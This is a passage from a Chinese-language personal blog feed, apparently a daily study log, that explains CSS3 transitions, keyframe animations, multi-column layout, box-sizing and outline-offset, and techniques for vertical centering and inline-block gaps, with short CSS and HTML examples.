0。</strong></p><h3 id="单项改变"><a href="#单项改变" class="headerlink" title="单项改变"></a>单项改变</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 设置将变化效果添加在“宽度”上，时长为2秒；该时长在其他属性上并不适用 */</span><br><span class="line">div&#123;</span><br><span class="line">  transition: width 2s;</span><br><span class="line">  -moz-transition: width 2s;         /* Firefox 4 */</span><br><span class="line">  -webkit-transition: width 2s;      /* Safari 和 Chrome */</span><br><span class="line">  -o-transition: width 2s;           /* Opera */</span><br><span class="line">&#125;</span><br><span class="line">/* 配合在一起使用的效果就是当鼠标移上去的时候宽度变为300px，这个过程耗时2秒 */</span><br><span class="line">div:hover&#123;</span><br><span class="line">  width:300px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意： 当鼠标移出元素时，它会逐渐变回原来的样式。</strong></p><h3 id="多项改变"><a href="#多项改变" class="headerlink" title="多项改变"></a>多项改变</h3><p><strong>如需向多个样式添加过渡效果，请添加多个属性，由逗号隔开。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/* 同时向宽度、高度和转换添加过渡效果 */</span><br><span class="line">div&#123;</span><br><span class="line">  transition: width 2s, height 2s, transform 2s;</span><br><span class="line">  -moz-transition: width 2s, height 2s, -moz-transform 2s;</span><br><span class="line">  -webkit-transition: width 2s, height 2s, -webkit-transform 2s;</span><br><span class="line">  -o-transition: width 2s, height 2s,-o-transform 2s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 当鼠标移上时宽度和高度都变成200px，同时旋转180度，每个属性变化都耗时2秒 */</span><br><span class="line">div:hover&#123;</span><br><span class="line">  width:200px;</span><br><span class="line">  height:200px;</span><br><span class="line">  transform:rotate(180deg);</span><br><span class="line">  -moz-transform:rotate(180deg);        /* Firefox 4 */</span><br><span class="line">  -webkit-transform:rotate(180deg);     /* Safari and Chrome */</span><br><span class="line">  -o-transform:rotate(180deg);          /* Opera */</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="过渡属性详解"><a href="#过渡属性详解" class="headerlink" title="过渡属性详解"></a>过渡属性详解</h3><p><strong><font color="#FF8C00">transition是简写属性</font></strong><br><strong>语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法： transition : transition-property | transition-duration | transition-timing-function | transition-delay;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>transition</td><td>简写属性，用于在一个属性中设置四个过渡属性。</td></tr><tr><td>transition-property</td><td>规定应用过渡的 CSS 属性的名称。</td></tr><tr><td>transition-duration</td><td>定义过渡效果花费的时间。默认是 0。</td></tr><tr><td>transition-timing-function</td><td>规定过渡效果的时间曲线。默认是 “ease”。</td></tr><tr><td>transition-delay</td><td>规定过渡效果何时开始。默认是 0。</td></tr></tbody></table><h2 id="CSS3-动画"><a href="#CSS3-动画" class="headerlink" title="CSS3 动画"></a>CSS3 动画</h2><p>通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。</p><p>CSS3 中通过<font color="#FF00FF">@keyframes 规则</font>来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。</p><h3 id="通过from-to关键字设置动画发生的时间"><a href="#通过from-to关键字设置动画发生的时间" class="headerlink" title="通过from , to关键字设置动画发生的时间"></a>通过from , to关键字设置动画发生的时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/* 通过@keyframes 创建动画 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Firefox */</span><br><span class="line">@-moz-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Safari 和 Chrome */</span><br><span class="line">@-webkit-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* Opera */</span><br><span class="line">@-o-keyframes myfirst &#123;</span><br><span class="line">  from &#123;background: red;&#125;</span><br><span class="line">  to &#123;background: yellow;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性</span><br><span class="line">   1.指定动画的名称；</span><br><span class="line">   2.指定动画的时长；</span><br><span class="line">*/</span><br><span class="line">div&#123;</span><br><span class="line">  animation: myfirst 5s;</span><br><span class="line">  -moz-animation: myfirst 5s;       /* Firefox */</span><br><span class="line">  -webkit-animation: myfirst 5s;    /* Safari 和 Chrome */</span><br><span class="line">  -o-animation: myfirst 5s;         /* Opera */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过百分比设置动画发生的时间"><a href="#通过百分比设置动画发生的时间" class="headerlink" title="通过百分比设置动画发生的时间"></a>通过百分比设置动画发生的时间</h3><p>动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 “from” 和 “to”来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  0%   &#123;background: red;&#125;</span><br><span class="line">  25%  &#123;background: yellow;&#125;</span><br><span class="line">  50%  &#123;background: blue;&#125;</span><br><span class="line">  100% &#123;background: green;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 同时改变背景色和位置 */</span><br><span class="line">@keyframes myfirst&#123;</span><br><span class="line">  0%   &#123;background: red; left:0px; top:0px;&#125;</span><br><span class="line">  25%  &#123;background: yellow; left:200px; top:0px;&#125;</span><br><span class="line">  50%  &#123;background: blue; left:200px; top:200px;&#125;</span><br><span class="line">  75%  &#123;background: green; left:0px; top:200px;&#125;</span><br><span class="line">  100% &#123;background: red; left:0px; top:0px;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动画属性详解"><a href="#动画属性详解" class="headerlink" title="动画属性详解"></a>动画属性详解</h3><p><strong>animation是<font color="#FF00FF">除了animation-play-state属性所有动画属性的简写属性</font>。</strong></p><p>语法： animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */</span><br><span class="line">div&#123;</span><br><span class="line">  animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Firefox: */</span><br><span class="line">  -moz-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Safari 和 Chrome: */</span><br><span class="line">  -webkit-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">  /* Opera: */</span><br><span class="line">  -o-animation: myfirst 5s linear 2s infinite alternate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>@keyframes</td><td>规定动画。</td></tr><tr><td>animation</td><td>所有动画属性的简写属性，除了 animation-play-state 属性。</td></tr><tr><td>animation-name</td><td>规定 @keyframes 动画的名称。</td></tr><tr><td>animation-duration</td><td>规定动画完成一个周期所花费的秒或毫秒。默认是 0。</td></tr><tr><td>animation-timing-function</td><td>规定动画的速度曲线。默认是 “ease”。</td></tr><tr><td>animation-delay</td><td>规定动画何时开始。默认是 0。</td></tr><tr><td>animation-iteration-count</td><td>规定动画被播放的次数。默认是 1。</td></tr><tr><td>animation-direction</td><td>规定动画是否在下一周期逆向地播放。默认是 “normal”。</td></tr><tr><td>animation-play-state</td><td>规定动画是否正在运行或暂停。默认是 “running”。</td></tr><tr><td>animation-fill-mode</td><td>规定对象动画时间之外的状态。</td></tr></tbody></table><h2 id="CSS3-多列"><a href="#CSS3-多列" class="headerlink" title="CSS3 多列"></a>CSS3 多列</h2><p>通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。</p><h3 id="CSS3-创建多列"><a href="#CSS3-创建多列" class="headerlink" title="CSS3 创建多列"></a>CSS3 创建多列</h3><p><strong>column-count属性规定元素应该被分隔的列数。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 将div中的文本分为3列 */</span><br><span class="line">div&#123;</span><br><span class="line">  column-count:3;</span><br><span class="line">  -moz-column-count:3;        /* Firefox */</span><br><span class="line">  -webkit-column-count:3;     /* Safari 和 Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-规定列之间的间隔"><a href="#CSS3-规定列之间的间隔" class="headerlink" title="CSS3 规定列之间的间隔"></a>CSS3 规定列之间的间隔</h3><p><strong>column-gap属性规定列之间的间隔。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置列之间的间隔为 40 像素 */</span><br><span class="line">div&#123;</span><br><span class="line">  column-gap:40px;</span><br><span class="line">  -moz-column-gap:40px;        /* Firefox */</span><br><span class="line">  -webkit-column-gap:40px;     /* Safari 和 Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-列规则"><a href="#CSS3-列规则" class="headerlink" title="CSS3 列规则"></a>CSS3 列规则</h3><p><strong>column-rule属性设置列之间的宽度、样式和颜色规则。</strong><br>语法： column-rule : column-rule-width | column-rule-style | column-rule-color</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">  column-rule:3px outset #ff0000;</span><br><span class="line">  -moz-column-rule:3px outset #ff0000;       /* Firefox */</span><br><span class="line">  -webkit-column-rule:3px outset #ff0000;    /* Safari and Chrome */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>column-count</td><td>规定元素应该被分隔的列数。</td></tr><tr><td>column-fill</td><td>规定如何填充列。</td></tr><tr><td>column-gap</td><td>规定列之间的间隔。</td></tr><tr><td>column-rule</td><td>设置所有 column-rule-* 属性的简写属性。</td></tr><tr><td>column-rule-width</td><td>规定列之间规则的宽度。</td></tr><tr><td>column-rule-style</td><td>规定列之间规则的样式。</td></tr><tr><td>column-rule-color</td><td>规定列之间规则的颜色。</td></tr><tr><td>column-span</td><td>规定元素应该横跨的列数。</td></tr><tr><td>column-width</td><td>规定列的宽度。</td></tr><tr><td>columns</td><td>语法 : column-width column-count。</td></tr></tbody></table><h2 id="CSS3-用户界面"><a href="#CSS3-用户界面" class="headerlink" title="CSS3 用户界面"></a>CSS3 用户界面</h2><h3 id="CSS3-resize"><a href="#CSS3-resize" class="headerlink" title="CSS3 resize"></a>CSS3 resize</h3><p><strong>在 CSS3中resize属性设置是否可由用户调整元素尺寸。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 设置div可以由用户调整大小 */</span><br><span class="line">div&#123;</span><br><span class="line">  resize:both;</span><br><span class="line">  overflow:auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CSS3-box-sizing"><a href="#CSS3-box-sizing" class="headerlink" title="CSS3 box-sizing"></a>CSS3 box-sizing</h3><p><strong>box-sizing属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* 规定两个并排的带边框方框 */</span><br><span class="line">div&#123;</span><br><span class="line">  box-sizing:border-box;</span><br><span class="line">  -moz-box-sizing:border-box;        /* Firefox */</span><br><span class="line">  -webkit-box-sizing:border-box;     /* Safari */</span><br><span class="line">  width:50%;</span><br><span class="line">  float:left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSS3-outline-offset"><a href="#CSS3-outline-offset" class="headerlink" title="CSS3 outline-offset"></a>CSS3 outline-offset</h3><p><strong>outline-offset属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。</strong><br>轮廓与边框有两点不同：</p><ul><li>轮廓不占用空间；</li><li>轮廓可能是非矩形；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* 规定边框边缘之外 15 像素处的轮廓 */</span><br><span class="line">div&#123;</span><br><span class="line">  border:2px solid black;</span><br><span class="line">  outline:2px solid red;</span><br><span class="line">  outline-offset:15px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://files.shanqianche.cn/20228/1660027998787.png" alt="outline-offset"></p><h1 id="css：inline-block-的-div-之间的空隙，原因及解决"><a href="#css：inline-block-的-div-之间的空隙，原因及解决" class="headerlink" title="css：inline-block 的 div 之间的空隙，原因及解决"></a>css：inline-block 的 div 之间的空隙，原因及解决</h1><p>display:inline-block布局的元素<strong>在chrome下会出现几像素的间隙</strong>，原因是因为我们在编辑器里写代码的时候，同级别的标签不写在同一行以保持代码的整齐可读性，<font color="#FF00FF">即inline-block布局的元素在编辑器里不在同一行</font>，即存在换行符，因此这就是著名的<font color="#FF00FF">inline-block“换行符/空格间隙问题”</font>。<font color="#FF8C00">如果inline-block元素间有空格或是换行产生了间隙，那是正常的，应该的。如果没有空格与间隙才是不正常的（IE6/7 block水平元素）。</font><br><strong>解决方法：</strong></p><ol><li>把img标签的display属性改成block：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img&#123;dispaly:block;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>把div中的字体大小设为0：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div&#123;font-size:0;&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>如果是img，修改img的vertical-align属性：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img&#123;vertical-align:buttom;&#125;</span><br><span class="line">img&#123;vertical-align:middle;&#125;</span><br><span class="line">img&#123;vertical-align:top;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>移除标签间的空格</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li&lt;/li&gt;&lt;li&gt;这是另一个li&lt;/li&gt;&lt;li&gt;这是另另一个li&lt;/li&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 方式二：在标签结束处消除换行符</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另另一个li</span><br><span class="line">    &lt;/li&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">// 方式三：HTML注释标签</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;这是一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另另一个li&lt;/li&gt;&lt;!--</span><br><span class="line">    --&gt;&lt;li&gt;这是另另另一个li&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布局(第十一天)</title>
      <link href="/2022/08/05/%E5%B8%83%E5%B1%80(%E7%AC%AC%E5%8D%81%E4%B8%80%E5%A4%A9)/"/>
      <url>/2022/08/05/%E5%B8%83%E5%B1%80(%E7%AC%AC%E5%8D%81%E4%B8%80%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="未知高度元素垂直居中、垂直居中的实现方式有哪些"><a href="#未知高度元素垂直居中、垂直居中的实现方式有哪些" class="headerlink" title="未知高度元素垂直居中、垂直居中的实现方式有哪些"></a>未知高度元素垂直居中、垂直居中的实现方式有哪些</h1><ol><li>绝对定位+css3 transform:translate(-50%，-50%)</li></ol><p><img src="http://files.shanqianche.cn/20228/1659665882690.png" alt="绝对定位+CSS"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.wrap&#123;</span><br><span class="line">  position:relative;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top:50%;</span><br><span class="line">  left:50%;</span><br><span class="line">  -webkit-transform:translate(-50%,-50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>css3 的flex布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.wrap&#123;</span><br><span class="line">  display:flex;</span><br><span class="line">  justify-content:center;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  align-self:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>table布局</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;wrap&quot;&gt;</span><br><span class="line">   &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">          &lt;div&gt;sadgsdgasgd&lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">.wrap&#123;</span><br><span class="line">  display:table;</span><br><span class="line">  text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">.child&#123;</span><br><span class="line">  background:#ccc;</span><br><span class="line">  display:table-cell;</span><br><span class="line">  vertical-align:middle;</span><br><span class="line">&#125;</span><br><span class="line">.child div&#123;</span><br><span class="line">    width:300px;</span><br><span class="line">    height:150px;</span><br><span class="line">    background:red;</span><br><span class="line">    margin:0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现图片垂直居中"><a href="#实现图片垂直居中" class="headerlink" title="实现图片垂直居中"></a>实现图片垂直居中</h1><ol><li>使用flex实现图片垂直居中</li></ol><blockquote><p>利用 display: flex;align-items: center 实现垂直居中。flex可能不是实现垂直居中最好的选择，<strong>因为IE8,9并不支持它。</strong></p></blockquote><p><img src="http://files.shanqianche.cn/20228/1659666725528.png" alt="垂直居中"><br>html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;flexbox&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123; background:#999&#125;</span><br><span class="line">.flexbox&#123;width: 300px;height: 250px;background:#fff;display: flex;align-items: center&#125;</span><br><span class="line">.flexbox img&#123;width: 100px;height: 100px;align-items: center;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>利用Display: table;实现img图片垂直居中</li></ol><p>给最外层的div设置display属性为table;img的父元素div设置display:table-cell,vertical-align: middle;<strong>如果你也想实现水平居中，你可以给最外层的div元素添加text-align: center属</strong>性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;tablebox&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;imgbox&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.tablebox&#123;width: 300px;height: 250px;background: #fff;display: table&#125;</span><br><span class="line">#imgbox&#123;display: table-cell;vertical-align: middle;&#125;</span><br><span class="line">#imgbox img&#123;width: 100px&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>用绝对定位实现垂直居中（推荐-兼容性好）</li></ol><ul><li>给img的父元素添加相对定位属性（position: relative），同时，要给子元素也就是图片img元素添加绝对定位属性（position: absolute）。</li><li>将图片元素的top属性设置为50%。</li><li>现在我们需要给img元素设置一个负的margin-top值，<font color="#FF00FF">这个值为你想要实现垂直居中的元素高度的一半，*如果不确定元素的高度，可以不使用margin-top，而是使用transform:translateY(-50%);属性</font>。</li></ul><p>记住：如果你想要同时实现水平居中，那么你可以用实现垂直居中的一样的技巧来实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123;background: #ccc;&#125;</span><br><span class="line">.posdiv&#123;width: 300px;height: 250px;background: #fff;position: relative; margin:0 auto&#125;</span><br><span class="line">.posdiv img&#123;width: 100px;position: absolute;top: 50%;margin-top: -50px;&#125;</span><br></pre></td></tr></table></figure><h1 id="设置斑马线表格-纯css"><a href="#设置斑马线表格-纯css" class="headerlink" title="设置斑马线表格(纯css)"></a>设置斑马线表格(纯css)</h1><p><img src="http://files.shanqianche.cn/20228/1659667287150.png" alt="斑马线表格"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line"> &lt;title&gt;斑马线表格&lt;/title&gt;</span><br><span class="line"> &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"> *&#123;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  